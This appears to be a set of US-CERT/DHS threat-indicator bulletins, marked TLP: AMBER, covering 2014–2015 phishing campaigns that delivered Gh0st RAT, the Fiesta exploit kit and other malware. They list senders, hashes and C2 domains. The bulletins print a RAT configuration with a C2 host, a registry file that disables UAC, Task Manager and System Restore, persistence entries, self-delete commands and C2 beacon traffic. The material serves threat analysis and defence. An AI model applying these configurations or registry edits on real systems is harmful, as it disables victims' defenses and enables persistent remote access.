--------- <?xml version="1.0" encoding="UTF-8" standalone="no"?> <!DOCTYPE properties SYSTEM "http://java.sun.com/dtd/properties.dtd"> <properties> <comment>Java Software</comment> <entry key="VMWARE">true</entry> <entry key="malw">true</entry> <entry key="PLUGIN_EXTENSION">Q0Pmy</entry> <entry key="PORT">1030</entry> <entry key="proex">true</entry> <entry key="unthreat">true</entry> <entry key="INSTALL">true</entry> <entry key="INSTALL_TIME">2000</entry> <entry key="ikarus">true</entry> <entry key="JAR_FOLDER">HmCuCoeEGt</entry> <entry key="JAR_EXTENSION">f1Ktq</entry> <entry key="windef">true</entry> <entry key="resys">true</entry> <entry key="outpost">true</entry> <entry key="escan">true</entry> <entry key="bull">true</entry> <entry key="clam">true</entry> <entry key="norton">true</entry> <entry key="taskmgr">true</entry> <entry key="mc">true</entry> <entry key="trend">true</entry> <entry key="fprot">true</entry> <entry key="super">true</entry> <entry key="RECONNECTION_TIME">2000</entry> <entry key="wire">true</entry> <entry key="prohac">true</entry> <entry key="CONNECTION_TIME">2000</entry> <entry key="k7">true</entry> <entry key="ahnlab">true</entry> <entry key="spybot">true</entry> <entry key="vipre">true</entry> <entry key="quickheal">true</entry> <entry key="JAR_REGISTRY">fEckgGX33k</entry> <entry key="MUTEX">3Y1flC7QuSz</entry> <entry key="adaware">true</entry> <entry key="norman">true</entry> <entry key="uac">true</entry> <entry key="gdata">true</entry> <entry key="mcshield">true</entry> <entry key="panda">true</entry> <entry key="immunet">true</entry> <entry key="fsecure">true</entry> <entry key="PLUGIN_FOLDER">D4xFpDxDRT</entry> <entry key="DNS">mega5checker.mooo.com</entry> <entry key="comodo">true</entry> <entry key="nano">true</entry> <entry key="JAR_NAME">YpuOm6eCQa</entry> <entry key="VBOX">false</entry> <entry key="baidu">true</entry> <entry key="NICKNAME">OWO</entry> </properties> -------------------

This is a malicious WINDOWS registry file. Once the commands are run the details from the file are added to the registry. Each time the user attempts to launch a program in the list below, "svchost.exe" will be launched instead:
-------- Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System] "ConsentPromptBehaviorAdmin"=dword:00000000 "ConsentPromptBehaviorUser"=dword:00000000 "EnableLUA"=dword:00000000 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\UserAccountControlSettings.exe] "debugger"="svchost.exe" [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System] "DisableTaskMgr"=dword:00000002 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Taskmgr.exe] "debugger"="svchost.exe" [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore] "DisableConfig"=dword:00000001 "DisableSR"=dword:00000001 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ProcessHacker.exe] "debugger"="svchost.exe" stix:STIX_Header.stix:Title: Multiple Sites Redirected to Fiesta Exploit Kit
stix:STIX_Header.stix:Description: On 30 March 2015, a financial sector user was referred to the site americanwx.com, then redirected to yoursophs.com, which redirected to mefastmap.eu and the malicious Adobe Flash video, hpeiqyg904.swf (MD5: 43d3699614f6a844a22a9f54d5ea70f4). This malware was identified as the Fiesta Exploit Kit. The activity was associated with the Kovter click-fraud campaign.

stix:Indicator.indicator:Description:
The domain americanwx.com resolved to IP 141.101.125.92 at the time of the report.
This compromised site contains malicious JavaScript, which is only visible upon hitting the site indirectly from an accepted referrer such as Google. The JavaScript redirects to yoursophs.com, which again redirects to a landing page at mefastmap.eu.
This domain resolved to IP 136.243.224.9 at the time of the report. The site americanwx.com redirected to yoursophs.com, which then redirected to mefastmap.eu.

Users were redirected to this site from yoursophs.com. The following GET request was observed:
GET /pve7s23q/5052a91a7f3a155a00060c09530205560d060d09555b015a0005040b56085505;130000;206 HTTP/1.1 Accept: */* Accept-Language: en-US Referer: http://mefastmap.eu/pve7s23q/Dwmdc7eVZnCqcvP-L-gW x-flash-version: 13,0,0,206 Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0) Host: mefastmap.eu DNT: 1 Via: 1.1 localhost.localdomain 0AEC940B
HTTP/1.1 200 OK Server: nginx/1.4.4 Date: Mon, 30 Mar 2015 15:55:10 GMT Content-Type: application/x-shockwave-flash Content-Length: 10341 Connection: close Last-Modified: Mon, 30 Mar 2015 15:55:10 GMT Content-Disposition: inline; filename=hpeiqyg904.swf
The site mefastmap.eu contains obfuscated, malicious JavaScript that assesses the victim machine then delivers an exploit based on enumerated parameters. In the observed instance, an Adobe Flash exploit was delivered. There was no payload delivery identified during this instance.
The Fiesta Exploit Kit has been observed to deliver Kovter click-fraud malware. Kovter has functions to deter execution in virtual machines, and when encountered the exploit kit was running in a virtual machine environment.
This malware was identified as the Fiesta Exploit Kit used to exploit the Adobe Flash vulnerability CVE-2014-8440. It was downloaded from http://mefastmap.eu/pve7s23q/Dwmdc7eVZnCqcvP-L-gW.

stix:STIX_Header.stix:Title: Malware Observed Containing Simplified Chinese-Language Malware
stix:STIX_Header.stix:Description: On April 4, 2015, US-CERT was notified by a trusted third party of an intrusion and network enumeration campaign using Chinese-language malware.

marking:Marking_Structure.simpleMarking:Statement: This Indicator Bulletin is provided "as is" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained within. The DHS does not endorse any commercial product or service, referenced in this bulletin or otherwise. This document is marked TLP: AMBER. Recipients may only share TLP: AMBER information with members of their own organization, and only as widely as necessary to act on that information. For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp.

stix:Indicator.indicator:Description:
File size not provided.
This file is a webshell and hacking toolkit.

File size not provided.
This is a web-based proxy tool. The menus of this file were rewritten so that they were available in simplified Chinese.

File size not provided.
The attackers were able to escalate privileges on the network by exploiting CVE-2013-2094 using this malware.

stix:STIX_Header.stix:Title: Phishing Email with Office Monkeys Theme Leads to Malware
stix:STIX_Header.stix:Description:
On 3 July 2014, a phishing email was sent from juliecarr73@bellsouth.net with the subject "FW: :))))" and a link to the malicious archive Monkeys LOL Video.zip on the online storage service Dropbox. The malware payload, Office_Monkeys.exe (MD5: 95b3ec0a4e539efaa1faa3d4e25d51de), called back to www.sanjosemaristas.com.
According to a third party report, this file was also used in a campaign that targeted DIB contractors and US Government users in September 2014. The campaign referenced the "office monkeys" from the Career Builder television commercials.

[REDACTED NAME] Research Analyst [REDACTED] ---- END EMAIL BODY ----

The executable contained within the .zip file on Dropbox is a self-extracting .rar archive. When executed, it creates Monkeys.exe and player.exe in the %UserProfileAppdata%\Local\Temp location, then executes these files.

Monkeys.exe seems to read in information from itself and then player.exe performs the subsequent installation.
The comment below contains SFX script commands in the %UserProfileAppData%\Roaming\ATI_Subsystem\ directory:
Path=%TEMP% Setup=%TEMP%\Monkeys.exe Setup=%TEMP%\player.exe Silent=1 Overwrite=1
amdhcp32.dll atiumdag.dll aticaldd.dll racss.dat amdocl_as32.exe (This is a legitimate Rundll32.exe file responsible for the traffic)
It then executes amdocl_as32.exe
CMD C:\Users\sharkpanda\AppData\Roaming\ATI_Subsystem\amdocl_as32.exe C:\Users\sharkpanda\AppData\Roaming\ATI_Subsystem\atiumdag.dll, ADL2_ApplicationProfiles_System_Reload 3648
This results in a command prompt being created and issuing a Taskkill against the current PID number for player.exe
CMD /Q /C TASKKILL /F /PID 3648 > NUL & DEL /F /Q C:\Users\SHARKP~1\AppData\Local\Temp\player.exe > NUL
It will then proceed to make communication out to the designated command and control(C2).

This file was identified as a supporting 32-bit DLL payload.
Import Hash: 4fcca208e21237d4a38b26f2461938ce Date: 0x53B475F4 [Wed Jul 2 21:13:24 2014 UTC] EP: 0x100016f3 .text 0/4 CRC: Claimed: 0x19af8, Actual: 0x19af8 Compile Timestamp: 2014-07-02 17:13:24 Section Hashes: .text c63d5a0e405625a824f5cd498f7dae25 .rdata b65b64ca311f66a4705c1ee584e8a3a8 .data 28547ea51f1dce81ebf915c8efecfbf5 .reloc aefa0501f2dca88c0caf05445444834c

GET /app/index.php? HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32) Host: www.sanjosemaristas.com Connection: Keep-Alive
GET /app/index.php?set=17& HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32) Host: www.sanjosemaristas.com Connection: Keep-Alive

stix:STIX_Header.stix:Title: Spear-Phishing Email Using "Pleasantly surprised" Theme Containing Malicious Attachment
stix:STIX_Header.stix:Description: On May 13, 2015, US-CERT was notified by a trusted third party of a spear-phishing campaign using "Pleasantly surprised" themed email containing a malicious attachment.

marking:Marking_Structure.simpleMarking:Statement: This Indicator Bulletin is provided "as is" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained within. The DHS does not endorse any commercial product or service, referenced in this bulletin or otherwise. This document is marked TLP: AMBER. Recipients may only share TLP: AMBER information with members of their own organization, and only as widely as necessary to act on that information. For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp.

stix:Indicator.indicator:Description: The sender's email address was not provided by the trusted third party.

When the Gh0st RAT dropper is executed, it modified the System Registry with configuration values and created the hidden folder C:\WinRecel and dropped in "Sys.dat" and "air.dll". It then executed "air.dll" with command 'rundll32.exe c:\WinRecel\air.dll LoadEntryPoint', then removed itself from the system by executing the following command 'cmd /c ping 127.0.0.1 -n 1&del "C:\Documents and Settings\User\Desktop\Pleasantly surprised.exe"', then terminated.

When the DLL was executed (i.e. rundll32.exe c:\WinRecel\air.dll LoadEntryPoint), the DLL loads the shell code from Sys.dat, created C:\WINDOWS\Temp\Sys.inf, and modified the System Registry for persistence by executing 'rundll32.exe advpack.dll,LaunchINFSection c:\windows\Temp\Sys.inf,DefaultInstall'.
Network traffic is over TCP port 300. DNS request over port 53.

stix:STIX_Header.stix:Title: Phishing Email with Pleasantly Surprised Theme
stix:STIX_Header.stix:Description:
On 05 January 2015, a phishing email was sent from thorner7@comcast.com with the subject "Pleasantly surprised". The email included the malicious attachment Pleasantly surprised.zip (MD5: C0FB1A22B75568E20CA086DD92F1FAFE), which contained the Gh0st remote administration tool (RAT). The Gh0st RAT called back to www.meitanjiaoyiwang.com.
Similar activity was previously described in IB-14-10663.

This is a malicious Gh0st RAT installer. It creates folder "C:\Recycle09102014\" and writes DLL "GameUpdate.log" to it. It launches "GameUpdate.log" with command: "rundll32.exe GameUpdate.log,LoaderEntry" and executes the following command: "cmd /c ping 127.0.0.1 -n 1&del "C:\DOCUME~1\User\LOCALS~1\Temp\Pleasantly surprised.exe". stix:STIX_Header.stix:Title: Mongolian Language Phishing Email
stix:STIX_Header.stix:Description: On 24 December 2014, a Mongolian language phishing email was sent from n.biligbaatar@hushmail.com to a U.S. Government Department. The email had the subject "Zul sariin bayriin mend" and the malicious attachment Zul sariin bayriin mend.doc (MD5: d4da3a747e8b9b4be1c39a900e652909). The malware communicates with keep.regebky.com (137.175.36.13).

When this file is opened with Microsoft Word, it performs the following actions: - Exploits vulnerability CVE-2012-0158 - Installs xpsfiltsvcs.dll (MD5: D1B27411AE5D20B6520477D0D04FCFF1) in the user's Local Temp directory - Modifies the System Registry to enable persistence for xpsfiltsvcs.dll to execute the next time the user logs on - Terminates Word
File added: C:\Documents and Settings\[User]\Local Settings\Temp\xpsfiltsvcs.dll
Registry value added: HKEY_USERS\S-1-5-21-1454471165-1644491937-839522115-1003\Software\Microsoft\Windows\CurrentVersion\Run\xpsfiltsvcs = rundll32.exe C:\DOCUME~1\[User]\LOCALS~1\Temp\xpsfiltsvcs.dll,XpsRegisterServer
When this .dll is executed, it installs Awl.txt (MD5: C70F2812B22A222547EC5C551D3FC916) in the user's Local Temp directory, executes it, and terminates.

This file was installed by xpsfiltsvcs.dll (MD5: D1B27411AE5D20B6520477D0D04FCFF1). According to the report, this .dll was likely given a .txt filename extension in an attempt to disguise it from being and executable file. When executed, this file attempts to send victim computer information to keep.regebky.com.

The file Awl.txt (MD5: C70F2812B22A222547EC5C551D3FC916) sends a DNS Request to keep.regebky.com on port 53 then sends a TCP connection to keep.regebky.com on port 80, with the following HTTP POST:
00000000 50 4f 53 54 20 2f 66 61 76 69 63 6f 6e 2e 69 63 POST /fa vicon.ic 00000010 6f 20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73 74 o HTTP/1 .1..Host 00000020 3a 20 6b 65 65 70 2e 72 65 67 65 62 6b 79 2e 63 : keep.r egebky.c 00000030 6f 6d 0d 0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67 om..Cont ent-Leng 00000040 74 68 3a 20 33 34 34 0d 0a 43 61 63 68 65 2d 43 th: 344. .Cache-C 00000050 6f 6e 74 72 6f 6c 3a 20 6e 6f 2d 63 61 63 68 65 ontrol: no-cache 00000060 0d 0a 0d 0a 00 55 aa 30 30 30 43 32 39 35 35 42 .....U.0 00C2955B 00000070 43 36 42 00 00 00 00 00 00 00 00 00 00 00 04 00 C6B..... ........ 00000080 00 00 00 00 00 00 00 00 00 00 00 00 00 c8 00 00 ........ ........
Traffic continues approximately every 120 seconds.
As of 29 December 2014, this domain resolved to IP 137.175.36.13.

stix:STIX_Header.stix:Description: On April, 22 2015, US-CERT was notified by a trusted third party of a spear-phishing campaign using "financially" themed emails containing malicious attachments.

stix:STIX_Header.stix:Title: Phishing Email with Pleasantly Surprised Theme
stix:STIX_Header.stix:Description:
On 5 January 2015, a phishing email was sent from multiple senders with the subject "Pleasantly surprised". The email included the malicious attachment Pleasantly surprised.zip (MD5: c0fb1a22b75568e20ca086dd92f1fafe or 10bb31ee7971062d9dc730719266a22b). The attachments included the Gh0st remote administration tool (RAT). The Gh0st RAT called back to the domain www.meitanjiaoyiwang.com.
Many previous campaigns used the theme "Pleasantly surprised", which was first seen in IB-13-10762 and most recently in IB-14-10663.

stix:Indicator.indicator:Description: This attachment contained the malicious file Pleasantly surprised.Exe (MD5: c37c66da4c35937a07ea12652fcc75cf).

This malware was included in the attachment Pleasantly surprised.zip (MD5: c0fb1a22b75568e20ca086dd92f1fafe).
Based on previously similar campaigns, this malware is likely related to the Gh0st RAT.

The Gh0st RAT file MD5: c37c66da4c35937a07ea12652fcc75cf called back to this site on port 704. The Gh0st RAT file MD5: 152c519cc4523a0f0755e142272e009f called back on port 705. The network packet contained the magic word "ASDFG".
The domain www.meitanjiaoyiwang.com was previously used in many similar campaigns. It was first seen in IB-13-10762, and most recently in IB-14-10663, IB-14-10649, and IB-14-10636.

This email campaign also used the following senders:
warrenignacio@aol.com lmpaglia@comcast.net razmandi@earthlink.net
This malicious attachment contained the Gh0st RAT file Pleasantly surprised.Exe (MD5: c37c66da4c35937a07ea12652fcc75cf).
This Gh0st RAT payload called back to www.meitanjiaoyiwang.com:705.

stix:STIX_Header.stix:Title: Phishing Emails Contain Pleasantly Surprised Theme with Gh0st RAT
stix:STIX_Header.stix:Description: On 13 May 2015, a phishing campaign targeted a U.S. Government Department. The emails contained the subject "Pleasantly surprised" and the malicious file Pleasantly surprised.zip (MD5: 688E380A3D896879F5DF8AAB6E6C947D). If the malware is successfully executed it calls out to www.meitanjiaoyiwang.com and sends data.

stix:Indicator.indicator:Description:
This email originated from a compromised Comcast email account.
-----START EMAIL HEADER ----- Received: from resomta-po-06v.sys.comcast.net ([96.114.154.230]) by resqmta-po-04v.sys.comcast.net with comcast id TTLe1q0074yXVJQ01TLec8; Wed, 13 May 2015 15:20:38 +0000 Received: from resmail-po-031v.sys.comcast.net ([162.150.176.41]) by resomta-po-06v.sys.comcast.net with comcast id TTLd1q00N0ty8Ya01TLdZU; Wed, 13 May 2015 15:20:38 +0000 Date: Wed, 13 May 2015 15:20:37 +0000 (UTC) From: [REDACTED] To: [REDACTED] Message-ID: <1109108286.13729607.1431530437121.JavaMail.zimbra@comcast.net> In-Reply-To: <1107663969.13729513.1431530433643.JavaMail.zimbra@comcast.net> Subject: Pleasantly surprised MIME-Version: 1.0 Content-Type: multipart/mixed; boundary="----=_Part_13729603_1641779038.1431530437112" X-Originating-IP: [::ffff:98.126.239.50] X-Mailer: Zimbra 8.0.7_GA_6031 (ZimbraWebClient - FF37 (Win)/8.0.7_GA_6031) Thread-Topic: Pleasantly surprised Thread-Index: xc1UsLp/Xfj0awZSA99KNmUeHcUHCg== DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=comcast.net; s=q20140121; t=1431530438; bh=RiQ7nHJ7eU1pJbmgo2WLVZ9liMQqlCWj+3mJFADxVo4=; h=Received:Received:Date:From:To:Message-ID:Subject:MIME-Version: Content-Type;  aYHzfcjot71QA== ----- END EMAIL HEADER ----- The email body was blank.
This file saves itself in the temp directory and then deletes itself. This file contains the installer for Gh0st RAT, Pleasantly surprised.exe (MD5: E9B3C7B389AA15C55C7B28A49D606AF4).

Path: C:\Documents and Settings\[USER]\Desktop
If executed successfully, the malware modifies the system registry with configuration values and creates the hidden folder C:\WinRecel to install the files Sys.dat (MD5: 27F1F6F7F37A75134C52F1E06435383E) and air.dll(MD5: 9F364F9FC9BEA84D42E128FA37DE9FE4). It executes air.dll with the following command: "rundll32.exe c:\WinRecel\air.dll LoadEntryPoint"
The installer Pleasantly surprised.exe then removes itself from the user's desktop by executing the following command: "cmd /c ping 127.0.0.1 -n 1&del C:\Documents and Settings\[User]\Desktop\Pleasantly surprised.exe"
Registry Values added: ---------------------------------- HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\BITS\LoginAddress: PIXeBZjsQcToRZfgSdr0QcXoRZWnSJrkKg== HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\BITS\LoginPort: yEC9Kg== HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BITS\LoginAddress: PIXeBZjsQcToRZfgSdr0QcXoRZWnSJrkKg== HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BITS\LoginPort: yEC9Kg==

When the DLL is executed, it loads the shell code from Sys.dat (MD5: 27F1F6F7F37A75134C52F1E06435383E), creates Sys.inf (MD5: 8ABEA0A2E49E59FE66127BB55B4D427B), and modifies the system registry for persistence by executing "rundll32.exe advpack.dll, LaunchINFSection c:\windows\Temp\Sys.inf,DefaultInstall".

This file makes the following changes: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate=rundll32.exe c:\WinRecel\air.dll LoadEntryPoint
This file contains the shellcode for the Gh0st RAT that is required by the installer air.dll (9F364F9FC9BEA84D42E128FA37DE9FE4). When executed, it calls back to www.meitanjiaoyiwang.com.

This file contains the information for the Gh0st RAT. It contained the following strings:
[Version] Signature="$CHICAGO$" [DefaultInstall] AddReg=GameUpdate [GameUpdate] HKLM,Software\Microsoft\Windows\CurrentVersion\Run,WinUpdate,0,"rundll32.exe c:\WinRecel\air.dll LoadEntryPoint"

stix:STIX_Header.stix:Title: Malicious Tools Reported with Associated Callback Domains
stix:STIX_Header.stix:Description: On 04 February 2015, various tools were reported that have capabilities such as keylogging and data exfiltration. One of the tools may be a backdoor. They also used callback domains peakrarray.com, cdrstart.com, and ranktable.com for command and control (C2) and data exfiltration. These tools were reported to exploit the following CVEs: CVE-2012-0158 CVE-2013-0640 CVE-2013-3906

stix:STIX_Header.stix:Title: Federal and County Agencies Targeted with Pleasantly Surprised Emails
stix:STIX_Header.stix:Description: On 10 March 2015, US Government and county-level government agencies received phishing emails from paul.castro@comcast.net with the subject "Pleasantly Surprised". The emails included the malicious attachment Pleasantly surprised.zip (MD5: 69A2F92A33B8BD9740434DE3F95F4332), which contained the Gh0st remote administration tool (RAT).

stix:Indicator.indicator:Description:
This is the first of two email examples included in the report. Each email included the same .zip archive attachment named "Pleasantly surprised.zip" (MD5: 69A2F92A33B8BD9740434DE3F95F4332).
----- START EMAIL HEADER ONE ----- Received: from resomta-ch2-11v.sys.comcast.net ([69.252.207.107]) by resqmta-ch2-12v.sys.comcast.net with comcast id 1oS81q0032Ka2Q501oSabg; Tue, 10 Mar 2015 12:26:34 +0000 Received: from resmail-ch2-197v.sys.comcast.net ([162.150.48.231]) by resomta-ch2-11v.sys.comcast.net with comcast id 1oSa1q00J4zH2Z601oSa9C; Tue, 10 Mar 2015 12:26:34 +0000 Date: Tue, 10 Mar 2015 12:26:33 +0000 (UTC) From: paul.castro@comcast.net To: [REDACTED] Message-ID: <1762859182.2432608.1425990393852.JavaMail.zimbra@comcast.net> In-Reply-To: <1680146687.2432356.1425990366956.JavaMail.zimbra@comcast.net> Subject: Pleasantly surprised MIME-Version: 1.0 Content-Type: multipart/mixed; boundary="----=_Part_2432604_1426149379.1425990393844" X-Originating-IP: [::ffff:67.229.225.82] X-Mailer: Zimbra 8.0.7_GA_6031 (ZimbraWebClient - FF36 (Win)/8.0.7_GA_6031) Thread-Topic: Pleasantly surprised Thread-Index: oZn01sqXbFWr7D/tEobJaYSKSsZjfw== DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=comcast.net; s=q20140121; t=1425990394; bh=rBhFpOo61qhnsg0LTj2UX7XQm6K+b7gcBvEksqxnT4Q=; h=Received:Received:Date:From:To:Message-ID:Subject:MIME-Version: Content-Type; b=X69wxxUyjr6V6uofOLkXLTh97taJCLOGy2bqjcOZMhWcqr1kR4EPslNOUEZk8Yql7 V1ol2hszLAJwIZ+CcjBmJymxgaYRNo46rEChlb3DLjhiWIl++BdqYaXZq1U837gh7q eaXWKT/8zDzSrGwpG1LE6vNEh3nSBwY1SS6/oWxjUM9XEv4ylnkGw4BccNqWF13NED popjrX5EhNE2ghZjIJ4fcbKzK38i21Fkv7ny4eynEpT83Fv9g3tD7FaA9xpu3NZECp ahiLewNjkA2PxqjnERbQ54wOmC6ExbIoFY6++lrmeKr8B/a5DwH5HzvNaDDpND9mhJ aWLAcElNbCMtw== ----- END EMAIL HEADER ONE -----
----- BEGIN EMAIL BODY ONE ----- From: paul.castro@comcast.net; To: [REDACTED] Date: Tue Mar 10 12:26:33 GMT 2015 Subject: Pleasantly surprised Attachment: Pleasantly surprised.zip ----- END EMAIL BODY ONE -----

This is the second of two email examples. The email included the same .zip archive attachment named "Pleasantly surprised.zip" (MD5: 69A2F92A33B8BD9740434DE3F95F4332).
----- BEGIN EMAIL HEADER TWO ----- DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws; s=dk20050327; d=earthlink.net; b=G/TzSF6ls8dMrnJtteEXf2kzNrEohS/aI4QxjSbqXZ3uLlfZQjJo4NnwebkDhE4/; h=Message-ID:Date:From:Reply-To:To:Subject:Mime-Version:Content-Type:X-Mailer:X-ELNK-Trace:X-Originating-IP; Received: from [209.86.224.26] (helo=mswamui-bichon.atl.sa.earthlink.net) by elasmtp-spurfowl.atl.sa.earthlink.net with esmtpa (Exim 4.67) (envelope-from <debfloyd54@earthlink.net>) id 1YVIGK-0005pq-Is; Tue, 10 Mar 2015 07:23:48 -0400 Received: from 192.253.229.37 by webmail.earthlink.net with HTTP; Tue, 10 Mar 2015 07:23:48 -0400 Message-ID: <17259701.1425986628346.JavaMail.root@mswamui-bichon.atl.sa.earthlink.net> Date: Tue, 10 Mar 2015 19:23:48 +0800 (GMT+08:00) From: [REDACTED] <debfloyd54@earthlink.net> Reply-To: [REDACTED] <debfloyd54@earthlink.net> To: [REDACTED] Subject: Pleasantly surprised Mime-Version: 1.0 Content-Type: multipart/mixed; boundary="----=_Part_139_1830125.1425986628090" X-Mailer: EarthLink Zoo Mail 1.0 X-ELNK-Trace: 48f22812b7a7e1ab18814d73f659084e239a348a220c2609e1174b53885f93f1e 4da977a21b8c0cc666fa475841a1c7a350badd9bab72f9c350badd9bab72f9c X-Originating-IP: 209.86.224.26 ----- END EMAIL HEADER TWO -----
----- BEGIN EMAIL BODY TWO ----- From: [REDACTED] <debfloyd54@earthlink.net>; To: [REDACTED] Date: Tue Mar 10 11:23:48 GMT 2015 Subject: Pleasantly surprised Attachment: Pleasantly surprised.zip ----- END EMAIL BODY TWO -----
The observed file attachment is a ZIP archive file that contains the malicious executable "Pleasantly surprised.Exe".

This is the executable Gh0st RAT file contained in the attachment. It has an image icon that resembles a "play" button. The executable takes the following action when launched:
-It moves and renames itself to "C:\WINDOWS\Temp\WinLogon.exe".
-It writes "C:\Documents and Settings\All Users\Start Menu\Windpdate.txt".
-It then moves "Windpdate.txt" to "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\WinInit.url" for persistence.
-It then creates the mutex "MyKeepLive0303".
-It creates the keylog file "C:\WINDOWS\system32\ky1log.dat".
Once the process is completed, it performs a DNS query for www.meitanjiaoyiwang.com, and then attempts to connect via port 707. If successful, it sends out encrypted or encoded victim system information.
After the mutex is created, the keylog file "C:\WINDOWS\system32\ky1log.dat" is created. The file hash and size of this file will change as content is written to it.

After "Windpdate.txt" is written to "C:\Documents and Settings\All Users\Start Menu\", it is moved to "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\WinInit.url" for persistence. Windupdate.txt contains the following data:
[InternetShortcut] URL=C:\Windows\Temp\WinLogon.exe

cybox:Properties.FileObj:File_Path: C:\Documents and Settings\AllC:\Documents and Settings\All Users\Start Menu\

stix:STIX_Header.stix:Title: Scanned-In Fax Report Themed Phishing Email
stix:STIX_Header.stix:Description: On 26 February 2015, a US Government agency received a phishing email from F1Tool@europarl.europa.eu. The email included the subject "FAX REPORT (Scanned from a Xerox Machine)" and the link to download a file, http://www.tafex-trade.eu/eFAX/5463.ZIP

stix:Indicator.indicator:Description: ------BEGIN EMAIL HEADER------ Subject: FAX REPORT (Scanned from MFP-M453U) From: F1Tool <F1Tool@europarl.europa.eu>; SMTP From: prvs=1499e1be80=F1Tool@europarl.europa.eu; To: undisclosed-recipients:;; SMTP To: [REDACTED] Date: Thu Feb 26 08:08:10 GMT 2015 Received: from UCEXLWP011.ep.parl.union.eu ([10.27.249.45])by smtp10.ep.europa.eu (8.14.7/8.14.7) with ESMTP id t1Q88BQv019526;Thu, 26 Feb 2015 09:08:11 +0100 Received: from UCEXLWP018.ep.parl.union.eu ([169.254.8.10]) byUCEXLWP011.ep.parl.union.eu ([169.254.1.155]) with mapi id 14.03.0210.002;Thu, 26 Feb 2015 09:08:10 +0100 Thread-Topic: FAX REPORT (Scanned from MFP-M453U) Thread-Index: AdBRm1wAvIBM2bKzTsOQ+mB9e3aQaw== Message-ID: C4FF540171AA674F84C9EC43CF2020F7935E3854@UCEXLWP018.ep.parl.union.eu Accept-Language: en-US, en-GB Content-Language: en-US X-MS-Has-Attach: X-MS-TNEF-Correlator: x-originating-ip: [10.27.249.6] Content-Type: multipart/alternative;boundary="_000_C4FF540171AA674F84C9EC43CF2020F7935E3854UCEXLWP018eppar_" MIME-Version: 1.0 ------END EMAIL HEADER------ ----- BEGIN EMAIL BODY ----- From: F1Tool F1Tool@europarl.europa.eu To: [REDACTED] Subject: FAX REPORT (Scanned from a Xerox Machine) Date: Thu, 26 Feb 2015 08:05:04 +0000 --------------------------------------------------------- Incoming FAX Report --------------------------------------------------------- Date/Time: 2/26/2015 at 9:04:12 AM Pages: 1 Line number: 0 Please use the following link to download your file:http://www.tafex-trade.eu/eFAX/5463.ZIP ------------------------------------------QUIT ----- END EMAIL BODY -----
URL included in this specific eFax-themed phishing email.
5463.ZIP is a .ZIP archive that, when run, extracts files and attempts to install files and maintain persistence.

stix:STIX_Header.stix:Title: Mongolian Language Phishing Email Includes Backdoor Trojan
stix:STIX_Header.stix:Description:
On 12 March 2015, a U.S. Government Agency received several Mongolian language spear-phishing emails from tavan_tolgoi@aol.com with the subject "Tavantolgoin Medee No1 (20150305)". The emails contained a malicious attachment with the same filename (MD5: 438fe265ce7a7300ed5d14b4a282fc81). The malware attempts to install a backdoor trojan that calls back to here.pechooin.com.
The details of this email were reported without file attachment metadata in IB-15-10129.

stix:Indicator.indicator:Description:
The emails have Mongolian language in the subject and body. Tavan Tolgoi is an area in southern Mongolia that is known for its mining.
----- BEGIN EMAIL HEADER ------ From: tavan_tolgoi@aol.com; To: [REDACTED] Cc: [REDACTED] Date: Thu Mar 12 12:44:14 GMT 2015 Subject: Tavantolgoin Medee No1 (20150305) Attachment: Tavantolgoin Medee No1 (20150305).doc Received: from mtaomg-mbe01.mx.aol.com (mtaomg-mbe01.mx.aol.com [172.26.254.175])by omr-m04.mx.aol.com (Outbound Mail Relay) with ESMTP id 53A1D700000BB;Thu, 12 Mar 2015 08:44:15 -0400 (EDT) Received: from core-lia06a.mail.aol.com (core-lia06.mail.aol.com [10.76.8.6])by mtaomg-mbe01.mx.aol.com (OMAG/Core Interface) with ESMTP id 8CC8F38000081;Thu, 12 Mar 2015 08:44:14 -0400 (EDT) Received: from 210.112.241.190 by webprd-m04.mail.aol.com (10.74.6.144) with HTTP (WebMailUI); 2015-Mar-12 12:44:14 Message-Id: <14c0e0386ab-47a9-5a2b@webprd-m04.mail.aol.com> MIME-Version: 1.0 Content-Type: multipart/mixed; boundary="----=_Part_27270_370429135.1426164254376" X-MB-Message-Source: WebUI X-MB-Message-Type: User X-Mailer: JAS STD X-Originating-IP: [210.112.241.190] x-aol-global-disposition: G X-AOL-VSS-INFO: 5600.1067/98281 X-AOL-VSS-CODE: clean DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=mx.aol.com;s=20140625; 